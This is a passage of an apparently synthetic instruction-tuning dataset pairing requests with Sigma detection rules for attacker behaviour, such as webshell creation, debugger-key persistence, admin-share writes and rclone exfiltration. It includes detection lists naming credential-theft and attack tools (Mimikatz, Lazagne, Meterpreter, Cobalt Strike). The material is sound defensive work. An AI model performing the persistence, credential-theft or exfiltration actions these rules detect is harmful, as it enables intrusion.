      "Sigma": "logsource:\n    category: antivirus\ndetection:\n    selection:\n        - Signature|startswith:\n            - 'HTOOL'\n            - 'HKTL'\n            - 'SecurityTool'\n            - 'Adfind'\n            - 'ATK/'\n            - 'Exploit.Script.CVE'\n            # - 'FRP.'\n            - 'PWS.'\n            - 'PWSX'\n        - Signature|contains:\n            - 'Hacktool'\n            - 'ATK/'  # Sophos\n            - 'Potato'\n            - 'Rozena'\n            - 'Sbelt'\n            - 'Seatbelt'\n            - 'SecurityTool'\n            - 'SharpDump'\n            - 'Sliver'\n            - 'Splinter'\n            - 'Swrort'\n            - 'Impacket'\n            - 'Koadic'\n            - 'Lazagne'\n            - 'Metasploit'\n            - 'Meterpreter'\n            - 'MeteTool'\n            - 'Mimikatz'\n            - 'Mpreter'\n            - 'Nighthawk'\n            - 'PentestPowerShell'\n            - 'PowerSploit'\n            - 'PowerSSH'\n            - 'PshlSpy'\n            - 'PSWTool'\n            - 'PWCrack'\n            - 'Brutel'\n            - 'BruteR'\n            - 'Cobalt'\n            - 'COBEACON'\n            - 'Cometer'\n            - 'DumpCreds'\n            - 'FastReverseProxy'\n            - 'PWDump'\n    condition: selection\nfields:\n    - FileName\n    - User\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "highly relevant Antivirus alert that reports a hack tool or other attack tool",
      "answer": "In order to detect a highly relevant Antivirus alert that reports a hack tool or other attack tool, you should monitor antivirus logs for alerts that identify the presence of known hacking tools or attack tools. Specifically, look for signatures that start with 'HTOOL', 'HKTL', 'SecurityTool', 'Adfind', 'ATK/', 'Exploit.Script.CVE', 'PWS.', or 'PWSX'. Additionally, pay attention to signatures that contain the following strings: 'Hacktool', 'ATK/' (specifically noted for Sophos antivirus), 'Potato', 'Rozena', 'Sbelt', 'Seatbelt', 'SecurityTool', 'SharpDump', 'Sliver', 'Splinter', 'Swrort', 'Impacket', 'Koadic', 'Lazagne', 'Metasploit', 'Meterpreter', 'MeteTool', 'Mimikatz', 'Mpreter', 'Nighthawk', 'PentestPowerShell', 'PowerSploit', 'PowerSSH', 'PshlSpy', 'PSWTool', 'PWCrack', 'Brutel', 'BruteR', 'Cobalt', 'COBEACON', 'Cometer', 'DumpCreds', 'FastReverseProxy', and 'PWDump'.\n\nEnsure that for any detected alert, you collect at least the file name associated with the tool and the user account involved. Given the nature of these signatures, which are closely associated with intrusion tools and frameworks used in cyber attacks, it's highly unlikely that detections would be false positives. Such detections are critical for identifying potential breaches or unauthorized activities within a network, as they may involve attempts at privilege escalation, lateral movement, credential theft, or deploying additional payloads. This monitoring strategy aligns with MITRE ATT&CK tactics and techniques related to the use of credential access tools, discovery tools, defense evasion mechanisms, and execution techniques."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when PIM alerts are set to disabled..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when PIM (Privileged Identity Management) alerts are set to disabled, you should: Focus on monitoring the audit logs within Azure services. Specifically, look for instances where the message indicates a \"Disable PIM Alert\" action has occurred. This detection is crucial because it might signal an attacker's attempt to weaken security by turning off alerts for privileged account changes, which should otherwise be closely monitored. However, it's important to remember that there might be legitimate reasons for an administrator to disable these alerts, such as during a controlled maintenance period. Due to the potential severity of an attacker successfully disabling PIM alerts to conceal their activities, such events are classified with a high level of concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Disable PIM Alert\n    condition: selection\nfalsepositives:\n    - Administrator disabling PIM alerts as an active choice.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Disable PIM Alert\n    condition: selection\nfalsepositives:\n    - Administrator disabling PIM alerts as an active choice.\nlevel: high\n",
      "question": "when PIM alerts are set to disabled.",
      "answer": "In order to detect when PIM (Privileged Identity Management) alerts are set to disabled, you should: Focus on monitoring the audit logs within Azure services. Specifically, look for instances where the message indicates a \"Disable PIM Alert\" action has occurred. This detection is crucial because it might signal an attacker's attempt to weaken security by turning off alerts for privileged account changes, which should otherwise be closely monitored. However, it's important to remember that there might be legitimate reasons for an administrator to disable these alerts, such as during a controlled maintenance period. Due to the potential severity of an attacker successfully disabling PIM alerts to conceal their activities, such events are classified with a high level of concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting PowerShell scripts that try to access the default Windows MailApp MailBox. This indicates manipulation of or access to the stored emails of a user. E.g. this could be used by an attacker to exfiltrate or delete the content of the emails..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect PowerShell scripts that try to access the default Windows MailApp MailBox, indicating manipulation of or access to the stored emails of a user, such as potentially allowing an attacker to exfiltrate or delete the content of the emails, you should monitor Windows PowerShell script activities. Focus on identifying scripts engaging with the directory path that includes '\\Comms\\Unistore\\data', which is associated with the location where Windows MailApp stores emails. This surveillance should be implemented under the ps_script category for Windows, ensuring the monitoring aligns with the needed detection of unauthorized access or manipulation attempts directed at a user's stored email content. The identification process should rely on recognizing specific script text patterns that contain the mentioned directory path. While detections at this level are rated with a medium level of confidence, it is essential to consider that there might be scenarios where legitimate activities could cause similar detections, though such cases are usually labeled as unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: bade5735-5ab0-4aa7-a642-a11be0e40872\ndetection:\n    selection:\n        ScriptBlockText|contains: '\\Comms\\Unistore\\data'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: bade5735-5ab0-4aa7-a642-a11be0e40872\ndetection:\n    selection:\n        ScriptBlockText|contains: '\\Comms\\Unistore\\data'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "PowerShell scripts that try to access the default Windows MailApp MailBox. This indicates manipulation of or access to the stored emails of a user. E.g. this could be used by an attacker to exfiltrate or delete the content of the emails.",
      "answer": "In order to detect PowerShell scripts that try to access the default Windows MailApp MailBox, indicating manipulation of or access to the stored emails of a user, such as potentially allowing an attacker to exfiltrate or delete the content of the emails, you should monitor Windows PowerShell script activities. Focus on identifying scripts engaging with the directory path that includes '\\Comms\\Unistore\\data', which is associated with the location where Windows MailApp stores emails. This surveillance should be implemented under the ps_script category for Windows, ensuring the monitoring aligns with the needed detection of unauthorized access or manipulation attempts directed at a user's stored email content. The identification process should rely on recognizing specific script text patterns that contain the mentioned directory path. While detections at this level are rated with a medium level of confidence, it is essential to consider that there might be scenarios where legitimate activities could cause similar detections, though such cases are usually labeled as unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when net.exe is called with a password in the command line.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when net.exe is called with a password in the command line, you should monitor process creation logs on Windows systems for the execution of 'net.exe' or 'net1.exe'. Specifically, look for command lines that include 'use', followed by a network path (indicated by ':*\\\\'), and a specification of a user account ('/USER:* *'). It's crucial to exclude command lines that end with a space, as these are not part of this detection strategy. This monitoring approach aims to identify potential misuse of network utilities to gain unauthorized access or perform lateral movement, typically involving the input of credentials directly in the command line, which is a security concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' use '\n            - ':*\\\\'\n            - '/USER:* *'\n    filter_empty:\n        CommandLine|endswith: ' '\n    condition: all of selection_* and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' use '\n            - ':*\\\\'\n            - '/USER:* *'\n    filter_empty:\n        CommandLine|endswith: ' '\n    condition: all of selection_* and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "when net.exe is called with a password in the command line",
      "answer": "In order to detect when net.exe is called with a password in the command line, you should monitor process creation logs on Windows systems for the execution of 'net.exe' or 'net1.exe'. Specifically, look for command lines that include 'use', followed by a network path (indicated by ':*\\\\'), and a specification of a user account ('/USER:* *'). It's crucial to exclude command lines that end with a space, as these are not part of this detection strategy. This monitoring approach aims to identify potential misuse of network utilities to gain unauthorized access or perform lateral movement, typically involving the input of credentials directly in the command line, which is a security concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting addition of the \"Debugger\" value to the \"DbgManagedDebugger\" key in order to achieve persistence. Which will get invoked when an application crashes.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the addition of the \"Debugger\" value to the \"DbgManagedDebugger\" key in order to achieve persistence, which will get invoked when an application crashes, you should: Monitor Windows registry settings specifically under the category for registry changes, targeting the Windows product. Focus on detecting events where a value is being set (EventType: SetValue) specifically to the registry path ending with '\\Microsoft\\.NETFramework\\DbgManagedDebugger'. It is critical to exclude events where the details match a legitimate debugger setup, specifically the use of \"C:\\Windows\\system32\\vsjitdebugger.exe\" with various process and environment parameters. This exclusion helps in reducing false positives that are common in environments where developers might legitimately set up a debugger. Be aware that changing registry values, particularly in the context described, can be a technique used to maintain persistence by ensuring a debugger gets called upon application crashes, providing a covert way to execute malicious payloads. This monitoring should be considered of medium importance and should be attentive to the potential legitimate use of the debugger setup, particularly on developers\u2019 machines, to avoid unnecessary alarms. The tactics and techniques associated with this behavior include persistence, as it aims to ensure continuous malicious presence on the affected system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Microsoft\\.NETFramework\\DbgManagedDebugger'\n    filter:\n        Details: '\"C:\\Windows\\system32\\vsjitdebugger.exe\" PID %d APPDOM %d EXTEXT \"%s\" EVTHDL %d'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate use of the key to setup a debugger. Which is often the case on developers machines\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Microsoft\\.NETFramework\\DbgManagedDebugger'\n    filter:\n        Details: '\"C:\\Windows\\system32\\vsjitdebugger.exe\" PID %d APPDOM %d EXTEXT \"%s\" EVTHDL %d'\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate use of the key to setup a debugger. Which is often the case on developers machines\nlevel: medium\n",
      "question": "addition of the \"Debugger\" value to the \"DbgManagedDebugger\" key in order to achieve persistence. Which will get invoked when an application crashes",
      "answer": "In order to detect the addition of the \"Debugger\" value to the \"DbgManagedDebugger\" key in order to achieve persistence, which will get invoked when an application crashes, you should: Monitor Windows registry settings specifically under the category for registry changes, targeting the Windows product. Focus on detecting events where a value is being set (EventType: SetValue) specifically to the registry path ending with '\\Microsoft\\.NETFramework\\DbgManagedDebugger'. It is critical to exclude events where the details match a legitimate debugger setup, specifically the use of \"C:\\Windows\\system32\\vsjitdebugger.exe\" with various process and environment parameters. This exclusion helps in reducing false positives that are common in environments where developers might legitimately set up a debugger. Be aware that changing registry values, particularly in the context described, can be a technique used to maintain persistence by ensuring a debugger gets called upon application crashes, providing a covert way to execute malicious payloads. This monitoring should be considered of medium importance and should be attentive to the potential legitimate use of the debugger setup, particularly on developers\u2019 machines, to avoid unnecessary alarms. The tactics and techniques associated with this behavior include persistence, as it aims to ensure continuous malicious presence on the affected system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of the Process Monitor driver by processes other than Process Monitor (procmon) itself..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of the Process Monitor driver by processes other than Process Monitor (procmon) itself, you should monitor file events within Windows environments for the creation of files that contain the name '\\procmon' or end with the '.sys' extension, signifying driver files. However, it's crucial to exclude files initiated by the legitimate Process Monitor executables, namely 'procmon.exe' and 'procmon64.exe'. This approach helps in identifying potentially malicious attempts to mimic or misuse Process Monitor's functionalities, possibly for nefarious activities such as process injection, privilege escalation, or system surveillance. Be aware that there might be scenarios where legitimate instances of renamed Process Monitor binaries could trigger alerts, leading to false positives. This monitoring is tagged with techniques related to evasion and persistence, considering the medium level of alert it raises.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '\\procmon'\n        TargetFilename|endswith: '.sys'\n    filter_main_process_explorer:\n        Image|endswith:\n            - '\\procmon.exe'\n            - '\\procmon64.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Some false positives may occur with legitimate renamed process monitor binaries\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '\\procmon'\n        TargetFilename|endswith: '.sys'\n    filter_main_process_explorer:\n        Image|endswith:\n            - '\\procmon.exe'\n            - '\\procmon64.exe'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Some false positives may occur with legitimate renamed process monitor binaries\nlevel: medium\n",
      "question": "creation of the Process Monitor driver by processes other than Process Monitor (procmon) itself.",
      "answer": "In order to detect the creation of the Process Monitor driver by processes other than Process Monitor (procmon) itself, you should monitor file events within Windows environments for the creation of files that contain the name '\\procmon' or end with the '.sys' extension, signifying driver files. However, it's crucial to exclude files initiated by the legitimate Process Monitor executables, namely 'procmon.exe' and 'procmon64.exe'. This approach helps in identifying potentially malicious attempts to mimic or misuse Process Monitor's functionalities, possibly for nefarious activities such as process injection, privilege escalation, or system surveillance. Be aware that there might be scenarios where legitimate instances of renamed Process Monitor binaries could trigger alerts, leading to false positives. This monitoring is tagged with techniques related to evasion and persistence, considering the medium level of alert it raises."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Possible webshell file creation on a static web site.\nMore specifically, the Sigma rule should work as follows:\n\nTo detect possible webshell file creation on a static web site, certain parameters from Windows log sources, particularly focusing on web and file activities, should be monitored closely. This involves looking into file activities within specific directories associated with web server content. Notably, activity in the '\\inetpub\\wwwroot\\' directory is under scrutiny, especially the creation of files with extensions such as '.asp', '.ashx', and '.ph'. Additionally, attention is paid to activities in the directories '\\www\\', '\\htdocs\\', and '\\html\\' for the creation of files with the '.ph' extension.\n\nHowever, it's crucial to eliminate false positives to maintain the reliability of this detection. This includes ignoring file activities within temporary directories like '\\AppData\\Local\\Temp\\' and '\\Windows\\Temp\\' since these can be associated with benign processes like unpacking of executables. Similarly, activities that involve the system image or files related to legitimate tools such as 'xampp' are also disregarded to avoid misidentifying legitimate administration or development activities as malicious.\n\nThis detection approach is essential for identifying tactics and techniques associated with the deployment of webshells on static web sites, which can further indicate a cybersecurity threat. The main focus is to ensure accurate detection by carefully filtering out benign activities that could otherwise lead to false positive alerts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_wwwroot:\n        TargetFilename|contains: '\\inetpub\\wwwroot\\'\n    selection_ext1:\n        TargetFilename|contains:\n            - '.asp'\n            - '.ashx'\n            - '.ph'\n    selection_static:\n        TargetFilename|contains:\n            - '\\www\\'\n            - '\\htdocs\\'\n            - '\\html\\'\n    selection_ext2:\n        TargetFilename|contains: '.ph'\n    false_positive1:  # false positives when unpacking some executables in $TEMP\n        TargetFilename|contains:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\Windows\\Temp\\'\n    false_positive_system:\n        Image: 'System' # fp : backup/restore from drivers\n    false_positive_legitimate:\n        TargetFilename|contains: '\\xampp'\n    condition: ((selection_wwwroot and selection_ext1) or (selection_static and selection_ext2)) and not 1 of false_positive*\nfalsepositives:\n    - Legitimate administrator or developer creating legitimate executable files in a web application folder\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection_wwwroot:\n        TargetFilename|contains: '\\inetpub\\wwwroot\\'\n    selection_ext1:\n        TargetFilename|contains:\n            - '.asp'\n            - '.ashx'\n            - '.ph'\n    selection_static:\n        TargetFilename|contains:\n            - '\\www\\'\n            - '\\htdocs\\'\n            - '\\html\\'\n    selection_ext2:\n        TargetFilename|contains: '.ph'\n    false_positive1:  # false positives when unpacking some executables in $TEMP\n        TargetFilename|contains:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\Windows\\Temp\\'\n    false_positive_system:\n        Image: 'System' # fp : backup/restore from drivers\n    false_positive_legitimate:\n        TargetFilename|contains: '\\xampp'\n    condition: ((selection_wwwroot and selection_ext1) or (selection_static and selection_ext2)) and not 1 of false_positive*\nfalsepositives:\n    - Legitimate administrator or developer creating legitimate executable files in a web application folder\nlevel: high\n",
      "question": "Possible webshell file creation on a static web site",
      "answer": "To detect possible webshell file creation on a static web site, certain parameters from Windows log sources, particularly focusing on web and file activities, should be monitored closely. This involves looking into file activities within specific directories associated with web server content. Notably, activity in the '\\inetpub\\wwwroot\\' directory is under scrutiny, especially the creation of files with extensions such as '.asp', '.ashx', and '.ph'. Additionally, attention is paid to activities in the directories '\\www\\', '\\htdocs\\', and '\\html\\' for the creation of files with the '.ph' extension.\n\nHowever, it's crucial to eliminate false positives to maintain the reliability of this detection. This includes ignoring file activities within temporary directories like '\\AppData\\Local\\Temp\\' and '\\Windows\\Temp\\' since these can be associated with benign processes like unpacking of executables. Similarly, activities that involve the system image or files related to legitimate tools such as 'xampp' are also disregarded to avoid misidentifying legitimate administration or development activities as malicious.\n\nThis detection approach is essential for identifying tactics and techniques associated with the deployment of webshells on static web sites, which can further indicate a cybersecurity threat. The main focus is to ensure accurate detection by carefully filtering out benign activities that could otherwise lead to false positive alerts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Look for non-system accounts SMB accessing a file with write (0x2) access mask via administrative share (i.e C$)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to look for non-system accounts SMB accessing a file with write (0x2) access mask via administrative share (i.e C$), you should: Monitor Windows security logs for event ID 5145, which indicates an attempt to access a file system object. Specifically, pay attention to access attempts where the shared object name ends with 'C$', indicating an administrative share access, and where the AccessMask is set to '0x2', signifying write access. It is crucial to exclude events generated by system accounts, which can be identified by usernames ending with '$', as these are generally considered legitimate activities. While this monitoring approach aims to detect potential unauthorized access attempts via administrative shares by non-system accounts with write permissions, be aware that not all detections may represent malicious activity, and some may be unknown false positives. The associated attack techniques for this behavior include techniques related to credential access, lateral movement, and persistence, though specific MITRE ATT&CK tactics and techniques were not directly mentioned in the provided information.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        ShareName|endswith: 'C$'\n        AccessMask: '0x2'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        ShareName|endswith: 'C$'\n        AccessMask: '0x2'\n    filter:\n        SubjectUserName|endswith: '$'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Look for non-system accounts SMB accessing a file with write (0x2) access mask via administrative share (i.e C$).",
      "answer": "In order to look for non-system accounts SMB accessing a file with write (0x2) access mask via administrative share (i.e C$), you should: Monitor Windows security logs for event ID 5145, which indicates an attempt to access a file system object. Specifically, pay attention to access attempts where the shared object name ends with 'C$', indicating an administrative share access, and where the AccessMask is set to '0x2', signifying write access. It is crucial to exclude events generated by system accounts, which can be identified by usernames ending with '$', as these are generally considered legitimate activities. While this monitoring approach aims to detect potential unauthorized access attempts via administrative shares by non-system accounts with write permissions, be aware that not all detections may represent malicious activity, and some may be unknown false positives. The associated attack techniques for this behavior include techniques related to credential access, lateral movement, and persistence, though specific MITRE ATT&CK tactics and techniques were not directly mentioned in the provided information."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting deletion of registry keys containing the MSTSC connection history.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the deletion of registry keys containing the MSTSC connection history, you should: Monitor Windows registry operations for events where registry values or keys are deleted, specifically tracking the EventType of 'DeleteValue' or 'DeleteKey'. Focus on deletions targeting the registry paths that contain '\\Microsoft\\Terminal Server Client\\Default\\MRU' or '\\Microsoft\\Terminal Server Client\\Servers\\'. These paths are crucial as they store the Microsoft Terminal Services Client (MSTSC) connection history, which includes information about Remote Desktop Protocol (RDP) connections. An adversary might attempt to delete these registry keys to remove evidence of unauthorized remote connections or to clean traces after system exploration. Monitoring for such deletion activities signals a high-alert scenario due to the possible intention of hiding unauthorized access or preparing for further malicious activities without leaving historical connection information. Note that while this detection strategy is critical for uncovering potentially malicious behavior, be aware that there might be unknown false positives, indicating situations where such deletions are conducted for legitimate reasons not related to malicious activities. Therefore, each detected event should be appropriately investigated to confirm its nature.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_delete\n    product: windows\ndetection:\n    selection1:\n        EventType: DeleteValue\n        TargetObject|contains: '\\Microsoft\\Terminal Server Client\\Default\\MRU'\n    selection2:\n        EventType: DeleteKey\n        TargetObject|contains: '\\Microsoft\\Terminal Server Client\\Servers\\'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_delete\n    product: windows\ndetection:\n    selection1:\n        EventType: DeleteValue\n        TargetObject|contains: '\\Microsoft\\Terminal Server Client\\Default\\MRU'\n    selection2:\n        EventType: DeleteKey\n        TargetObject|contains: '\\Microsoft\\Terminal Server Client\\Servers\\'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "deletion of registry keys containing the MSTSC connection history",
      "answer": "In order to detect the deletion of registry keys containing the MSTSC connection history, you should: Monitor Windows registry operations for events where registry values or keys are deleted, specifically tracking the EventType of 'DeleteValue' or 'DeleteKey'. Focus on deletions targeting the registry paths that contain '\\Microsoft\\Terminal Server Client\\Default\\MRU' or '\\Microsoft\\Terminal Server Client\\Servers\\'. These paths are crucial as they store the Microsoft Terminal Services Client (MSTSC) connection history, which includes information about Remote Desktop Protocol (RDP) connections. An adversary might attempt to delete these registry keys to remove evidence of unauthorized remote connections or to clean traces after system exploration. Monitoring for such deletion activities signals a high-alert scenario due to the possible intention of hiding unauthorized access or preparing for further malicious activities without leaving historical connection information. Note that while this detection strategy is critical for uncovering potentially malicious behavior, be aware that there might be unknown false positives, indicating situations where such deletions are conducted for legitimate reasons not related to malicious activities. Therefore, each detected event should be appropriately investigated to confirm its nature."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of rclone, a command-line program to manage files on cloud storage, via its default user-agent string.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of rclone, a command-line program to manage files on cloud storage, via its default user-agent string, you should: monitor your proxy logs for traffic that includes user-agent strings beginning with 'rclone/v'. The detection aims to identify potential unauthorized or malicious use of the rclone tool, which could be involved in data exfiltration activities or unauthorized file access on cloud storage platforms. It's important to log the client IP address ('c-ip') associated with each relevant request to aid in further investigation or remediation efforts. While this detection method is valuable, be aware of possible false positives that may arise from legitimate use of rclone by system administrators or through sanctioned scripts. This activity is characterized by a medium level of concern due to the potential for misuse of the rclone tool in carrying out data theft or manipulation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent|startswith: 'rclone/v'\n    condition: selection\nfields:\n    - c-ip\nfalsepositives:\n    - Valid requests with this exact user agent to that is used by legitimate scripts or sysadmin operations\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent|startswith: 'rclone/v'\n    condition: selection\nfields:\n    - c-ip\nfalsepositives:\n    - Valid requests with this exact user agent to that is used by legitimate scripts or sysadmin operations\nlevel: medium\n",
      "question": "use of rclone, a command-line program to manage files on cloud storage, via its default user-agent string",
      "answer": "In order to detect the use of rclone, a command-line program to manage files on cloud storage, via its default user-agent string, you should: monitor your proxy logs for traffic that includes user-agent strings beginning with 'rclone/v'. The detection aims to identify potential unauthorized or malicious use of the rclone tool, which could be involved in data exfiltration activities or unauthorized file access on cloud storage platforms. It's important to log the client IP address ('c-ip') associated with each relevant request to aid in further investigation or remediation efforts. While this detection method is valuable, be aware of possible false positives that may arise from legitimate use of rclone by system administrators or through sanctioned scripts. This activity is characterized by a medium level of concern due to the potential for misuse of the rclone tool in carrying out data theft or manipulation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting 3CXDesktopApp updater downloading a known compromised version of the 3CXDesktopApp software.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the 3CXDesktopApp updater downloading a known compromised version of the 3CXDesktopApp software, you should: Monitor process creation logs in Windows for the execution of an application named 'update.exe' within the '\\3CXDesktopApp\\app\\' directory. Specifically, be attentive to command line executions that include all of the following parameters: '--update', 'http', and '/electron/update/win32/18.12'. Such a pattern indicates a high probability of the system attempting to download or install a compromised version of the 3CXDesktopApp software. It's crucial to note that detections related to this activity should be treated with a high level of concern due to the lack of well-known false positives associated with this detection criteria.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\3CXDesktopApp\\app\\update.exe'\n        CommandLine|contains|all:\n            - '--update'\n            - 'http'\n            - '/electron/update/win32/18.12'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\3CXDesktopApp\\app\\update.exe'\n        CommandLine|contains|all:\n            - '--update'\n            - 'http'\n            - '/electron/update/win32/18.12'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "3CXDesktopApp updater downloading a known compromised version of the 3CXDesktopApp software",
      "answer": "In order to detect the 3CXDesktopApp updater downloading a known compromised version of the 3CXDesktopApp software, you should: Monitor process creation logs in Windows for the execution of an application named 'update.exe' within the '\\3CXDesktopApp\\app\\' directory. Specifically, be attentive to command line executions that include all of the following parameters: '--update', 'http', and '/electron/update/win32/18.12'. Such a pattern indicates a high probability of the system attempting to download or install a compromised version of the 3CXDesktopApp software. It's crucial to note that detections related to this activity should be treated with a high level of concern due to the lack of well-known false positives associated with this detection criteria."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting owner is was removed from a application or service principal in Azure..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when an owner was removed from an application or service principal in Azure, you should: Monitor Azure activity logs specifically for messages indicating either \"Remove owner from service principal\" or \"Remove owner from application\". This involves keeping an eye on activities within the Azure environment to detect unauthorized modifications which can be indicative of malicious attempts to alter permissions or reduce the security posture of applications and services. It's important to note that while such removal actions can be part of regular administrative duties, they might also signify malicious activities. Hence, it's advisable to verify such actions, especially if they come from unfamiliar users, user agents, or originate from unexpected hostnames. If you determine that changes made are known behaviors and causing false alarms, you can adjust this monitoring rule to avoid unnecessary alerts. This detection carries a medium level of importance due to its potential implications on security and access controls.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        properties.message:\n            - Remove owner from service principal\n            - Remove owner from application\n    condition: selection\nfalsepositives:\n    - Owner being removed may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Owner removed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        properties.message:\n            - Remove owner from service principal\n            - Remove owner from application\n    condition: selection\nfalsepositives:\n    - Owner being removed may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Owner removed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "owner is was removed from a application or service principal in Azure.",
